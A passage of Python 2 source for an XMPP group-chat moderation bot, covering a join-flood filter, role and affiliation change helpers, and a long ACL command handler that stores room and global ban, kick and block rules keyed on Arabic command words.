     if not jid in FILTER_MEMBER[groupchat].keys():
      FILTER_MEMBER[groupchat][jid]={'lfly':0, 'lastprs':0,'new':0,'timz':0,'top':0} 
     if time.time()-FILTER_MEMBER[groupchat][jid]['lastprs']<=MAX_Time:                              
      FILTER_MEMBER[groupchat][jid]['lfly']+=1
      if FILTER_MEMBER[groupchat][jid]['lfly']>FILT_Join:
        if FILTER_MEMBER[groupchat][jid]['top']>=MAX_Join:
          FILTER_MEMBER[groupchat][jid]['top']=0
          FILTER_MEMBER[groupchat][jid]['lfly']=0                                                       
          ban1(cljid, groupchat, XFiltMSG[63]%(XFiltMSG[40]), jid)
        filter_melody1 (s, XFiltMSG[64], 'role', 'none')
        FILTER_MEMBER[groupchat][jid]['top']+=1		
     else: 
       FILTER_MEMBER[groupchat][jid]['lfly']=0
       FILTER_MEMBER[groupchat][jid]['top']=0
     FILTER_MEMBER[groupchat][jid]['lastprs']=time.time()
 except: pass

FILTER_chang = {}		
def melody_leave_nick(g, n, r, a, cljid):
 jid = get_true_jid(g+'/'+n)
 try: 
  if jid in FILTER_chang[g].keys() and a != "303": 
   del FILTER_chang[g][jid]
   return
 except: pass  
  
 if not g in GROUPCHATS:
  return
 if n == get_bot_nick(g):
  return  
 if not g in MUC_noisy:
  MUC_noisy[g]={} 
 if "on" in MUC_noisy[g].keys():
     msg(cljid,g,Xnoisy[3]%(n))        
register_leave_handler(melody_leave_nick)	

def filter_melody1(s, reason, moder,order):
    jid = get_true_jid(s)
    packet = IQ(CLIENTS[s[3]], 'set')
    query = packet.addElement('query', 'http://jabber.org/protocol/muc#admin')
    i = query.addElement('item')
    i['nick'] = s[2]
    i[moder] = order
    i.addElement('reason').addContent(reason)
    reactor.callFromThread(packet.send, s[1])    
def filter_memberx(s,moderx):
    packet = IQ(CLIENTS[s[3]], 'set')
    query = packet.addElement('query', 'http://jabber.org/protocol/muc#admin')
    i = query.addElement('item')
    i['nick'] = s[2]
    i['affiliation'] = moderx
    reactor.callFromThread(packet.send, s[1])
def filter_moderatorxx(s,moderx):
    packet = IQ(CLIENTS[s[3]], 'set')
    query = packet.addElement('query', 'http://jabber.org/protocol/muc#admin')
    i = query.addElement('item')
    i['nick'] = s[2]  
    i['role'] = moderx   
    reactor.callFromThread(packet.send, s[1])        
register_presence_handler(hnd_filter_prs_melody)
######################################################
######################################################
##ACL
def add_acl(t, s, p):
 Wacc = access_level=str(user_level(s[1]+'/'+s[2], s[1]))
 acls = [Xacl[7],Xacl[8],Xacl[9],Xacl[10],Xacl[11],Xacl[12],Xacl[13],Xacl[14],Xacl[3],Xacl[1],Xacl[5],Xacl[15],Xacl[16],Xacl_1[0],
Xacl[17],Xacl[18],Xacl[19],Xacl[20],Xacl[21],Xacl[22],Xacl[23],Xacl[24],Xacl[25],Xacl[4],Xacl[6],Xacl[2]]          
 bndx = ["فصل".decode('utf8'),"طرد".decode('utf8'),"حجب".decode('utf8')]
 son = ["#"]
 if not s[1] in GROUPCHATS:
  return
 if not s[1] in BANOS:
  BANOS[s[1]]={} 
 if not s[1] in BANCAPS:
  BANCAPS[s[1]]={}
 if not s[1] in BANRES:
  BANRES[s[1]]={}
 if not s[1] in BANDO:
  BANDO[s[1]]={}
 if not s[1] in BANJID:
  BANJID[s[1]]={}
 if not s[1] in BANST:
  BANST[s[1]]={}
 if not s[1] in smart:
  smart[s[1]]={}
 if not s[1] in msgx:
  msgx[s[1]]={}
 if not s[1] in BADNICK:
  BADNICK[s[1]]={}
 if not s[1] in ROLEX:
  ROLEX[s[1]]={}
 if not s[1] in BADall:
  BADall[s[1]]={}   
 if not s[1] in BANOS_2:
  BANOS_2[s[1]]={}    
 if not p: reply(t, s, s[2]+' : '+Xacl[26])
					
 else:
  sp=p.split()

  if not sp[0] in acls: reply(t, s, s[2]+' : '+Xacl[26])
  else:
   if sp[0] ==Xacl[17]: 
    if Wacc == "100":     
     try:
      if ":" in p:
       if " *" in p:
        xp = sp[2]  		
        if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p:
          wp=p.split("* ")[1].split(" #")[0] 
          try:
           tpx1=p.split("# ",1)[1]
          except: tpx1=s[2]		 
          if not xp in GBANOS and sp[0] == Xacl[17]:
           GBANOS[xp]={}
           GBANOS[xp][wp]={}
           GBANOS[xp][wp][tpx1]={}                                                                                 
           write_file(GBANOS_FILE, str(GBANOS))
           reply(t, s, s[2]+' : '+Xacl[27])
           for x in GROUPCHATS[s[1]].keys():
            banos_join_melody11(t, s, p,x)           
          else: 
           del GBANOS[xp]	
           write_file(GBANOS_FILE, str(GBANOS))		  
           GBANOS[xp]={}
           GBANOS[xp][wp]={}
           GBANOS[xp][wp][tpx1]={}                                                                                 
           write_file(GBANOS_FILE, str(GBANOS))
           reply(t, s, s[2]+' : '+Xacl[28])		 
         else: reply(t, s, s[2]+' : '+Xacl[34])   
        else: reply(t, s, s[2]+' : '+Xacl[31])
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29])                                  
     except: reply(t, s, s[2]+' : '+XMSG5)
     return
    else: reply(t, s, s[2]+' : '+XMSG12)		 
   if sp[0] == Xacl[18]:
    if Wacc == "100":   
     try:
      if ":" in p:
       if " *" in p:
        xp = sp[2]                               
        if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p:
          wp=p.split("* ")[1].split(" #")[0]
          try:
           tpx1=p.split("# ",1)[1]
          except: tpx1=s[2]                                                                  
          if not xp in GBANRES:                                                                     
           GBANRES[xp]={}
           GBANRES[xp][wp]={}
           GBANRES[xp][wp][tpx1]={}                                                                                 
           write_file(GBANRES_FILE, str(GBANRES))
           reply(t, s, s[2]+' : '+Xacl[27])
          else: 
           del GBANRES[xp]
           write_file(GBANRES_FILE, str(GBANRES))		  
           GBANRES[xp]={}
           GBANRES[xp][wp]={}
           GBANRES[xp][wp][tpx1]={}                                                                                 
           write_file(GBANRES_FILE, str(GBANRES))
           reply(t, s, s[2]+' : '+Xacl[28])
         else: reply(t, s, s[2]+' : '+XMSG1)   
        else: reply(t, s, s[2]+' : '+XMSG2)
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29])
     except: reply(t, s, s[2]+' : '+XMSG5)
     return
    else: reply(t, s, s[2]+' : '+XMSG12)	 
   if sp[0] == Xacl[20]:
    if Wacc == "100":   
     try:
      if ":" in p:
       if " *" in p:
        xp = sp[2]                               
        if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p:
          wp=p.split("* ")[1].split(" #")[0]
          try:
           tpx1=p.split("# ",1)[1]
          except: tpx1=s[2]	                                                                  
          if not xp in GBANCAPS:                                                                     
           GBANCAPS[xp]={}
           GBANCAPS[xp][wp]={}
           GBANCAPS[xp][wp][tpx1]={}                                                                                 
           write_file(GBANCAPS_FILE, str(GBANCAPS))
           reply(t, s, s[2]+' : '+Xacl[27])
          else: 
           del GBANCAPS[xp]	 
           write_file(GBANCAPS_FILE, str(GBANCAPS))		 
           GBANCAPS[xp]={}
           GBANCAPS[xp][wp]={}
           GBANCAPS[xp][wp][tpx1]={}                                                                                 
           write_file(GBANCAPS_FILE, str(GBANCAPS))
           reply(t, s, s[2]+' : '+Xacl[28])
         else: reply(t, s, s[2]+' : '+Xacl[34])   
        else: reply(t, s, s[2]+' : '+Xacl[32])
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29])
     except: reply(t, s, s[2]+' : '+XMSG5)
     return	
    else: reply(t, s, s[2]+' : '+XMSG12)	
   if sp[0] == Xacl[21]:
    if Wacc == "100":   
     try:
      if ":" in p:
       if " *" in p:
        if "@" not in sp[2]:	  
         xp = sp[2]                               
         if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
          if "#" in p:
           wp=p.split("* ")[1].split(" #")[0]
           try:
            tpx1=p.split("# ",1)[1]
           except: tpx1=s[2]                                                                     
           if not xp in GBANJID:                                                                     
            GBANJID[xp]={}
            GBANJID[xp][wp]={}
            GBANJID[xp][wp][tpx1]={}                                                                                 
            write_file(GBANJID_FILEX, str(GBANJID))
            reply(t, s, s[2]+' : '+Xacl[27])
           else:
            del GBANJID[xp]	  
            write_file(GBANJID_FILEX, str(GBANJID))		   
            GBANJID[xp]={}
            GBANJID[xp][wp]={}
            GBANJID[xp][wp][tpx1]={}                                                                                 
            write_file(GBANJID_FILEX, str(GBANJID))
            reply(t, s, s[2]+' : '+Xacl[28])

          else: reply(t, s, s[2]+' : '+XMSG1)   
         else: reply(t, s, s[2]+' : '+XMSG2)
        else: reply(t, s, s[2]+' : '+Xacl[41])
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29])
     except: reply(t, s, s[2]+' : '+XMSG5)
     return
    else: reply(t, s, s[2]+' : '+XMSG12)	 
   if sp[0] == Xacl[22]:
    if Wacc == "100":   
     try:
      if ":" in p:
       if " *" in p:
        xp = sp[2]                               
        if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p:
          wp=p.split("* ")[1].split(" #")[0]
          try:
           tpx1=p.split("# ",1)[1]
          except: tpx1=s[2]                                                                  
          if not xp in GBANST:                                                                     
           GBANST[xp]={}
           GBANST[xp][wp]={}
           GBANST[xp][wp][tpx1]={}                                                                                 
           write_file(GSTATUSBAD, str(GBANST))
           reply(t, s, s[2]+' : '+Xacl[27])
          else: 
           del GBANST[xp]
           write_file(GSTATUSBAD, str(GBANST))		  
           GBANST[xp]={}
           GBANST[xp][wp]={}
           GBANST[xp][wp][tpx1]={}                                                                                 
           write_file(GSTATUSBAD, str(GBANST))
           reply(t, s, s[2]+' : '+Xacl[28])

         else: reply(t, s, s[2]+' : '+XMSG1)   
        else: reply(t, s, s[2]+' : '+XMSG2)
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29])
     except: reply(t, s, s[2]+' : '+XMSG5)
     return		
    else: reply(t, s, s[2]+' : '+XMSG12)	 
   if sp[0] == Xacl[24]:
    if Wacc == "100":      
     try:
      if ":" in p:
       if " *" in p:
        xp = p.split(": ")[1].split(" *")[0]                                
        if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p:
          wp=p.split("* ")[1].split(" #")[0]
          try:
           tpx1=p.split("# ",1)[1]
          except: tpx1=s[2]                                                               
          if not xp in Gsmart:                                                                     
           Gsmart[xp]={}
           Gsmart[xp][wp]={}
           Gsmart[xp][wp][tpx1]={}                                                                                 
           write_file(Gsmart_FILE, str(Gsmart))
           reply(t, s, s[2]+' : '+Xacl[27])
          else:
           del Gsmart[xp]
           write_file(Gsmart_FILE, str(Gsmart))                                                              
           Gsmart[xp]={}
           Gsmart[xp][wp]={}
           Gsmart[xp][wp][tpx1]={}                                                                                 
           write_file(Gsmart_FILE, str(Gsmart))
           reply(t, s, s[2]+' : '+Xacl[28])
         else: reply(t, s, s[2]+' : '+Xacl[34])
        elif "قول".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p:
          wp=p.split("* ")[1].split(" #")[0]
          tpx1=p.split("# ",1)[1]                                                                  
          if not xp in Gmsgx:                                                                     
           Gmsgx[xp]={}
           Gmsgx[xp][wp]={}
           Gmsgx[xp][wp][tpx1]={}                                                                                 
           write_file(Gmsgx_FILE, str(Gmsgx))
           reply(t, s, s[2]+' : '+Xacl[27])
          else:
           del Gmsgx[xp]
           write_file(Gmsgx_FILE, str(Gmsgx))
           Gmsgx[xp]={}
           Gmsgx[xp][wp]={}
           Gmsgx[xp][wp][tpx1]={}                                                                                 
           write_file(Gmsgx_FILE, str(Gmsgx))
           reply(t, s, s[2]+' : '+Xacl[28])                                                                        
         else: reply(t, s, s[2]+' : '+Xacl[34])                                                             
        else: reply(t, s, s[2]+' : '+Xacl[33])
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29]) 
     except: reply(t, s, s[2]+' : '+XMSG5)
     return	
    else: reply(t, s, s[2]+' : '+XMSG12)		 
   if sp[0] == Xacl[23]:
    if Wacc == "100":   
     try:
      if ":" in p:
       if " *" in p:
        xp = sp[2]                               
        if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p:
          wp=p.split("* ")[1].split(" #")[0]
          try:
           tpx1=p.split("# ",1)[1]
          except: tpx1=s[2]                                                                  
          if not xp in GBADNICK:                                                                     
           GBADNICK[xp]={}
           GBADNICK[xp][wp]={}
           GBADNICK[xp][wp][tpx1]={}                                                                                 
           write_file(GBADNICK_FILE, str(GBADNICK))
           reply(t, s, s[2]+' : '+Xacl[27])
          else: 
           del GBADNICK[xp]
           write_file(GBADNICK_FILE, str(GBADNICK))		  
           GBADNICK[xp]={}
           GBADNICK[xp][wp]={}
           GBADNICK[xp][wp][tpx1]={}                                                                                 
           write_file(GBADNICK_FILE, str(GBADNICK))
           reply(t, s, s[2]+' : '+Xacl[28])
         else: reply(t, s, s[2]+' : '+XMSG1)   
        else: reply(t, s, s[2]+' : '+XMSG2)
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29])
     except: reply(t, s, s[2]+' : '+XMSG5)
     return		
    else: reply(t, s, s[2]+' : '+XMSG12)
   if sp[0] == Xacl[25]:
    if Wacc == "100":   
     try:
      if ":" in p:
       if " *" in p:
        xp = sp[2]                               
        if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p:
          wp=p.split("* ")[1].split(" #")[0]
          try:
           tpx1=p.split("# ",1)[1]
          except: tpx1=s[2]                                                                  
          if not xp in GBADall:                                                                     
           GBADall[xp]={}
           GBADall[xp][wp]={}
           GBADall[xp][wp][tpx1]={}                                                                                 
           write_file(GBADall_FILE, str(GBADall))
           reply(t, s, s[2]+' : '+Xacl[27])
          for x in GROUPCHATS[s[1]].keys():
           banos_join_melody11(t, s, p,x)			   
          else: 
           del GBADall[xp]
           write_file(GBADall_FILE, str(GBADall))		  
           GBADall[xp]={}
           GBADall[xp][wp]={}
           GBADall[xp][wp][tpx1]={}                                                                                 
           write_file(GBADall_FILE, str(GBADall))
           reply(t, s, s[2]+' : '+Xacl[28])
          for x in GROUPCHATS[s[1]].keys():
           banos_join_melody11(t, s, p,x)			   
         else: reply(t, s, s[2]+' : '+XMSG1)   
        else: reply(t, s, s[2]+' : '+XMSG2)
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29])
     except: reply(t, s, s[2]+' : '+XMSG5)
     return		
    else: reply(t, s, s[2]+' : '+XMSG12)    
   if sp[0] == Xacl[19]:
    if Wacc == "100":
     try:
      if ":" in p:
       if " *" in p:
        if "@" not in sp[2]:	  
         xp = sp[2]                               
         if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
          if "#" in p:
           wp=p.split("* ")[1].split(" #")[0]
           try:
            tpx1=p.split("# ",1)[1]
           except: tpx1=s[2]                                                                    
           if not xp in GBANDO:                                                                     
            GBANDO[xp]={}
            GBANDO[xp][wp]={}
            GBANDO[xp][wp][tpx1]={}                                                                                 
            write_file(GBANDO_FILE, str(GBANDO))
            reply(t, s, s[2]+' : '+Xacl[27])
           else:
            del GBANDO[xp]	
            write_file(GBANDO_FILE, str(GBANDO))		  
            GBANDO[xp]={}
            GBANDO[xp][wp]={}
            GBANDO[xp][wp][tpx1]={}                                                                                 
            write_file(GBANDO_FILE, str(GBANDO))	
            reply(t, s, s[2]+' : '+Xacl[28])

          else: reply(t, s, s[2]+' : '+XMSG1)   
         else: reply(t, s, s[2]+' : '+XMSG2)
        else: reply(t, s, s[2]+' : '+Xacl[42])
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29])  
     except: reply(t, s, s[2]+' : '+XMSG5)
     return	
    else: reply(t, s, s[2]+' : '+XMSG12)		 
   if sp[0] ==Xacl[15]:                
    try:
     if ":" in p:
      if "member" in p.split(":",1)[1].split("-")[0] or "moderator" in p.split(":",1)[1].split("-")[0] or "none" in p.split(":",1)[1].split("-")[0] or "visitor" in p.split(":",1)[1].split("-")[0]:                  
       if " *" in p:
        xp = sp[2]
        if "فصل".decode('utf8') in p.split("*",1)[1] or "طرد".decode('utf8') in p.split("*",1)[1]:
         if "#" in p:
          wp=p.split("* ")[1].split(" #")[0]
          try:
           tpx1=p.split("# ",1)[1]
          except: tpx1=s[2]	                                                             
          if not xp in ROLEX[s[1]].keys():
           ROLEX[s[1]][xp]={}
           ROLEX[s[1]][xp][wp]={}
           ROLEX[s[1]][xp][wp][tpx1]={}                                                                                 
           write_file(ROLEX_FILE, str(ROLEX))
           reply(t, s, s[2]+' : '+Xacl[27])
          else:
           del ROLEX[s[1]][xp]	
           write_file(ROLEX_FILE, str(ROLEX))                  
           ROLEX[s[1]][xp]={}
           ROLEX[s[1]][xp][wp]={}
           ROLEX[s[1]][xp][wp][tpx1]={}                                                                                 
           write_file(ROLEX_FILE, str(ROLEX))
           reply(t, s, s[2]+' : '+Xacl[28])                  
         else: reply(t, s, s[2]+' : '+Xacl[39]%(sp[0]+" "+sp[1]+" "+sp[2]+" "+sp[3]+" "+sp[4]))  
        elif "none" in p.split("*",1)[1].split("$")[0] or "visitor" in p.split("*",1)[1].split("$")[0] or "member" in p.split("*",1)[1].split("$")[0]:
         if "|" in p:
          wp=p.split("* ")[1].split(" |")[0]
          try:
           tpx1=p.split("| ",1)[1]
          except: tpx1="0"
          if not xp in ROLEX[s[1]].keys():
           ROLEX[s[1]][xp]={}
           ROLEX[s[1]][xp][wp]={}
           ROLEX[s[1]][xp][wp][tpx1]={}                                                                                 
           write_file(ROLEX_FILE, str(ROLEX))
           reply(t, s, s[2]+' : '+Xacl[27])
          else:
           del ROLEX[s[1]][xp]	
           write_file(ROLEX_FILE, str(ROLEX))                  
           ROLEX[s[1]][xp]={}
           ROLEX[s[1]][xp][wp]={}
           ROLEX[s[1]][xp][wp][tpx1]={}                                                                                 
           write_file(ROLEX_FILE, str(ROLEX))
           reply(t, s, s[2]+' : '+Xacl[28])                  
         else: reply(t, s, s[2]+' : '+Xacl[40]%(sp[0]+" "+sp[1]+" "+sp[2]+" "+sp[3]+" "+sp[4]))                                                                 
        else: reply(t, s, s[2]+' : '+Xacl[38]%(sp[2],sp[2],sp[2],sp[2],sp[2])) 
       else: reply(t, s, s[2]+' : '+Xacl[37])  
      else: reply(t, s, s[2]+' : '+Xacl[36])                                              
                                                                              
     else: reply(t, s, s[2]+' : '+Xacl[35])                                                 
    except: reply(t, s, s[2]+' : '+XMSG5)               
    return                
   if sp[0] ==Xacl[8]:                
    try:
     if ":" in p:
      if " *" in p:
       xp = sp[2]    	   
       if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
        if "#" in p:
         wp=p.split("* ")[1].split(" #")[0] 
         try:
          tpx1=p.split("# ",1)[1]
         except: tpx1=s[2]		 
         if not xp in BANOS[s[1]].keys():
          BANOS[s[1]][xp]={}
          BANOS[s[1]][xp][wp]={}
          BANOS[s[1]][xp][wp][tpx1]={}                                                                                 
          write_file(BANOS_FILE, str(BANOS))
          reply(t, s, s[2]+' : '+Xacl[27])
          for x in GROUPCHATS[s[1]].keys():
           banos_join_melody11(t, s, p,x)	
         else: 
          del BANOS[s[1]][xp]	
          write_file(BANOS_FILE, str(BANOS))		  
          BANOS[s[1]][xp]={}
          BANOS[s[1]][xp][wp]={}
          BANOS[s[1]][xp][wp][tpx1]={}                                                                                 
          write_file(BANOS_FILE, str(BANOS))
          reply(t, s, s[2]+' : '+Xacl[28])		 
        else: reply(t, s, s[2]+' : '+Xacl[34])   
       else: reply(t, s, s[2]+' : '+Xacl[31])
      else: reply(t, s, s[2]+' : '+Xacl[30])    
     else: reply(t, s, s[2]+' : '+Xacl[29]) 
                                        
    except: reply(t, s, s[2]+' : '+XMSG5)
    return
	
   if sp[0] == Xacl_1[0]:
    try:
     if ":" in p:
      if " *" in p:
       xp = sp[2]                               
       if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
        if "#" in p:
         wp=p.split("* ")[1].split(" #")[0]
         try:
          tpx1=p.split("# ",1)[1]
         except: tpx1=s[2]                                                                  
         if not xp in BANOS_2[s[1]].keys():                                                                     
          BANOS_2[s[1]][xp]={}
          BANOS_2[s[1]][xp][wp]={}
          BANOS_2[s[1]][xp][wp][tpx1]={}                                                                                 
          write_file(BANOS_2_FILE, str(BANOS_2))
          reply(t, s, s[2]+' : '+Xacl[27])
         else: 
          del BANOS_2[s[1]][xp]
          write_file(BANOS_2_FILE, str(BANOS_2))		  
          BANOS_2[s[1]][xp]={}
          BANOS_2[s[1]][xp][wp]={}
          BANOS_2[s[1]][xp][wp][tpx1]={}                                                                                 
          write_file(BANOS_2_FILE, str(BANOS_2))
          reply(t, s, s[2]+' : '+Xacl[28])

        else: reply(t, s, s[2]+' : '+XMSG1)   
       else: reply(t, s, s[2]+' : '+XMSG2)
      else: reply(t, s, s[2]+' : '+Xacl[30])    
     else: reply(t, s, s[2]+' : '+Xacl[29])
    except: reply(t, s, s[2]+' : '+XMSG5)
    return	
		
	
   if sp[0] == Xacl[9]:
    try:
     if ":" in p:
      if " *" in p:
       xp = sp[2]                               
       if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1]:
        if "#" in p:
         wp=p.split("* ")[1].split(" #")[0]
         try:
          tpx1=p.split("# ",1)[1]
         except: tpx1=s[2]	                                                                  
         if not xp in BANCAPS[s[1]].keys():                                                                     
          BANCAPS[s[1]][xp]={}
          BANCAPS[s[1]][xp][wp]={}
          BANCAPS[s[1]][xp][wp][tpx1]={}                                                                                 
          write_file(BANCAPS_FILE, str(BANCAPS))
          reply(t, s, s[2]+' : '+Xacl[27])
         else: 
          del BANCAPS[s[1]][xp]	 
          write_file(BANCAPS_FILE, str(BANCAPS))		 
          BANCAPS[s[1]][xp]={}
          BANCAPS[s[1]][xp][wp]={}
          BANCAPS[s[1]][xp][wp][tpx1]={}                                                                                 
          write_file(BANCAPS_FILE, str(BANCAPS))
          reply(t, s, s[2]+' : '+Xacl[28])
        else: reply(t, s, s[2]+' : '+Xacl[34])   
       else: reply(t, s, s[2]+' : '+Xacl[32])
      else: reply(t, s, s[2]+' : '+Xacl[30])    
     else: reply(t, s, s[2]+' : '+Xacl[29])
    except: reply(t, s, s[2]+' : '+XMSG5)
    return
   if sp[0] == Xacl[7]:
    try:
     if ":" in p:
      if " *" in p:
       xp = sp[2]                               
       if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
        if "#" in p:
         wp=p.split("* ")[1].split(" #")[0]
         try:
          tpx1=p.split("# ",1)[1]
         except: tpx1=s[2]                                                                  
         if not xp in BANRES[s[1]].keys():                                                                     
          BANRES[s[1]][xp]={}
          BANRES[s[1]][xp][wp]={}
          BANRES[s[1]][xp][wp][tpx1]={}                                                                                 
          write_file(BANRES_FILE, str(BANRES))
          reply(t, s, s[2]+' : '+Xacl[27])
         else: 
          del BANRES[s[1]][xp]
          write_file(BANRES_FILE, str(BANRES))		  
          BANRES[s[1]][xp]={}
          BANRES[s[1]][xp][wp]={}
          BANRES[s[1]][xp][wp][tpx1]={}                                                                                 
          write_file(BANRES_FILE, str(BANRES))
          reply(t, s, s[2]+' : '+Xacl[28])

        else: reply(t, s, s[2]+' : '+XMSG1)   
       else: reply(t, s, s[2]+' : '+XMSG2)
      else: reply(t, s, s[2]+' : '+Xacl[30])    
     else: reply(t, s, s[2]+' : '+Xacl[29])
    except: reply(t, s, s[2]+' : '+XMSG5)
    return
   if sp[0] == Xacl[16]:
    try:
     if ":" in p:
      if " *" in p:
       xp = sp[2]                               
       if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
        if "#" in p:
         wp=p.split("* ")[1].split(" #")[0]
         try:
          tpx1=p.split("# ",1)[1]
         except: tpx1=s[2]                                                                  
         if not xp in BADall[s[1]].keys():                                                                     
          BADall[s[1]][xp]={}
          BADall[s[1]][xp][wp]={}
          BADall[s[1]][xp][wp][tpx1]={}                                                                                 
          write_file(BADall_FILE, str(BADall))
          reply(t, s, s[2]+' : '+Xacl[27])
          for x in GROUPCHATS[s[1]].keys():
           banos_join_melody11(t, s, p,x)		  
         else: 
          del BADall[s[1]][xp]
          write_file(BADall_FILE, str(BADall))		  
          BADall[s[1]][xp]={}
          BADall[s[1]][xp][wp]={}
          BADall[s[1]][xp][wp][tpx1]={}                                                                                 
          write_file(BADall_FILE, str(BADall))
          reply(t, s, s[2]+' : '+Xacl[28])
          for x in GROUPCHATS[s[1]].keys():
           banos_join_melody11(t, s, p,x)			  

        else: reply(t, s, s[2]+' : '+XMSG1)   
       else: reply(t, s, s[2]+' : '+XMSG2)
      else: reply(t, s, s[2]+' : '+Xacl[30])    
     else: reply(t, s, s[2]+' : '+Xacl[29])
    except: reply(t, s, s[2]+' : '+XMSG5)
    return
   if sp[0] == Xacl[10]:
    try:
     if ":" in p:
      if " *" in p:
       if "@" not in sp[2]:	  
        xp = sp[2]                               
        if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p:
          wp=p.split("* ")[1].split(" #")[0]
          try:
           tpx1=p.split("# ",1)[1]
          except: tpx1=s[2]                                                                    
          if not xp in BANDO[s[1]].keys():                                                                     
           BANDO[s[1]][xp]={}
           BANDO[s[1]][xp][wp]={}
           BANDO[s[1]][xp][wp][tpx1]={}                                                                                 
           write_file(BANDO_FILE, str(BANDO))
           reply(t, s, s[2]+' : '+Xacl[27])
          else:
           del BANDO[s[1]][xp]	
           write_file(BANDO_FILE, str(BANDO))		  
           BANDO[s[1]][xp]={}
           BANDO[s[1]][xp][wp]={}
           BANDO[s[1]][xp][wp][tpx1]={}                                                                                 
           write_file(BANDO_FILE, str(BANDO))		 
           reply(t, s, s[2]+' : '+Xacl[28])

         else: reply(t, s, s[2]+' : '+XMSG1)   
        else: reply(t, s, s[2]+' : '+XMSG2)
       else: reply(t, s, s[2]+' : '+Xacl[42])
      else: reply(t, s, s[2]+' : '+Xacl[30])    
     else: reply(t, s, s[2]+' : '+Xacl[29])
    except: reply(t, s, s[2]+' : '+XMSG5)
    return
   if sp[0] == Xacl[11]:
    try:
     if ":" in p:
      if " *" in p:
       if "@" not in sp[2]:	  
        xp = sp[2]                               
        if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p:
          wp=p.split("* ")[1].split(" #")[0]
          try:
           tpx1=p.split("# ",1)[1]
          except: tpx1=s[2]                                                                     
          if not xp in BANJID[s[1]].keys():                                                                     
           BANJID[s[1]][xp]={}
           BANJID[s[1]][xp][wp]={}
           BANJID[s[1]][xp][wp][tpx1]={}                                                                                 
           write_file(BANJID_FILEX, str(BANJID))
           reply(t, s, s[2]+' : '+Xacl[27])
          else:
           del BANJID[s[1]][xp]	  
           write_file(BANJID_FILEX, str(BANJID))		   
           BANJID[s[1]][xp]={}
           BANJID[s[1]][xp][wp]={}
           BANJID[s[1]][xp][wp][tpx1]={}                                                                                 
           write_file(BANJID_FILEX, str(BANJID))
           reply(t, s, s[2]+' : '+Xacl[28])

         else: reply(t, s, s[2]+' : '+XMSG1)   
        else: reply(t, s, s[2]+' : '+XMSG2)
       else: reply(t, s, s[2]+' : '+Xacl[41])
      else: reply(t, s, s[2]+' : '+Xacl[30])    
     else: reply(t, s, s[2]+' : '+Xacl[29])
    except: reply(t, s, s[2]+' : '+XMSG5)
    return
   if sp[0] == Xacl[12]:
    try:
     if ":" in p:
      if " *" in p:
       xp = sp[2]                               
       if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
        if "#" in p:
         wp=p.split("* ")[1].split(" #")[0]
         try:
          tpx1=p.split("# ",1)[1]
         except: tpx1=s[2]                                                                  
         if not xp in BANST[s[1]].keys():                                                                     
          BANST[s[1]][xp]={}
          BANST[s[1]][xp][wp]={}
          BANST[s[1]][xp][wp][tpx1]={}                                                                                 
          write_file(STATUSBAD, str(BANST))
          reply(t, s, s[2]+' : '+Xacl[27])
         else: 
          del BANST[s[1]][xp]
          write_file(STATUSBAD, str(BANST))		  
          BANST[s[1]][xp]={}
